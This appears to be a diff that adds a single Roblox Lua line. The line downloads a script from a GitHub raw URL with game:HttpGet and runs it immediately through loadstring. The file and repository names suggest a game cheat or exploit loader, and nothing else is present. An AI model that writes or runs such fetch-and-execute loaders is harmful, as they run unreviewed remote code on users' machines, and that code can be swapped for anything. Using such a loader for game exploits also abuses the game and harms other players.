@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/ch2-chop-a-forest-spam2-d6z6kb6ohifj09.lua"))()
